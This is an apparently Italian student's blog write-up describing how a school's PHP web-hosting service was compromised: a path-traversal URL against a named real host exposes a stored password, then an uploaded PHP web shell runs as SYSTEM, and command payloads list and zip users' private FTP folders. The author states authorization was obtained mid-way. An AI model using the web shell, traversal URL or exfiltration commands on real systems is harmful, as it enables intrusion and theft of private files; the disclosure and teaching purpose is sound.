---
title: School adventure 2
date: 2025-05-09
tags: [rce, websec, writeup]
excerpt: Dal web hosting della scuola a una shell con privilegi di amministratore.
---

## Scoperta della vulnerabilità
La mia scuola offre a studenti e professori un servizio di **web hosting** ed **FTP**, e uno degli utenti che ne usufruisce è proprio uno dei miei **professori**.

Sapendo che il sito era scritto **interamente** in una versione **vecchia** di **PHP**, durante una lezione decisi di esplorarne un po’ le funzionalità per verificare se fosse **vulnerabile**.

Trovai alcune vulnerabilità semplici, come delle `Path Traversal` e cose di questo tipo. Deluso, pensavo di arrendermi quando, esplorando il filesystem, trovai un file chiamato
```
_ftp.php
```
La cosa mi **insospettì**; provai quindi a raggiungerlo tramite **browser**, ma richiedeva una **password**. Visualizzai allora il **codice sorgente** tramite un programma **vulnerabile** che stampava il **contenuto** del file specificato:
```
https://webuser.itis.pr.it/~dsacco/itis/_cat.php?file=../itis/_ftp.php
```
Il file conteneva una variabile `$password="xxxxx";`. Provai a usarla e ciò che ottenni fu questa schermata:
![image](posts/assets/H1fUzT4r1l.png)

> ❗Arrivato a questo punto, riportai tutto al professore e ottenni dall’amministratore di rete l’autorizzazione per continuare a exploitare questo servizio.

## Cosa trovai con ciò?
Questo programma aveva una funzionalità `dir` che, dato il path di una cartella, elencava i file al suo interno. Esplorai un po’ la struttura del sito e, quando provai a inserire come input `/`, trovai due cartelle:
![image](posts/assets/SkVqTFSHJl.png)
- `ftp`: conteneva le cartelle di tutti gli utenti
- `xampp`: conteneva i file di XAMPP; ciò significava che il server girava su di esso e questo mi fece capire che potevo fare molto di più.

## Cos'è xampp?
**XAMPP** è un software che permette di creare rapidamente un ambiente di test per la creazione di siti, mettendo a disposizione servizi come `Apache` e `MySQL`.
È molto utile per lo sviluppo e il testing, ma non dovrebbe essere utilizzato per servizi di questo tipo, poiché **Apache** (e quindi anche **PHP**) viene avviato da un unico utente, spesso (come in questo caso) dall’**amministratore**.

## L'exploit
Mi feci creare un **utente** su questo **servizio** dall’amministratore per poter effettuare questi **test**.
Una volta ottenuto l’**accesso** FTP alla **mia** cartella, caricai una **reverse shell**:
```php
<?php
    if (isset($_GET["cmd"])) {       // Check if there's a command
        $cmd = $_GET["cmd"];         // Take the command from the GET
        $out = shell_exec($cmd);     // Execute the command
        echo highlight_string($out); // Print the output
    }
?>
```
Provai quindi a eseguire `/?cmd=whoami` e, come mi aspettavo:
![image](posts/assets/HJ6ktGsBye.png)

`nt authority\system` è l'utente più alto che esista in un ambiente **windows**; ciò significava che la mia shell era runnata con tutti i permessi.

## Quindi? cosa potevo fare?
Avere una shell con **privilegi** di amministratore significava poter **eseguire** potenzialmente **qualsiasi** comando o programma.
Ad esempio, come detto prima, questo **servizio** ospitava uno **spazio ftp** per consentire agli utenti di **salvare** file in una cartella `/privata`. Con un **payload** del tipo:
```
/?cmd=dir%20E:\ftp\itis\<nome_prof>\privata
```
potevo ottenere la lista di tutti i file privati di professori e studenti.
![Screenshot](posts/assets/Bk1OzHjHkg.png)

E con un semplice comando potevo zippare e scaricarli:
```
/?cmd=powershell.exe Compress-Archive -Path "C:\E:\ftp\itis\<nome_prof>\privata" -DestinationPath "../privata/<nome_prof>.zip"
```
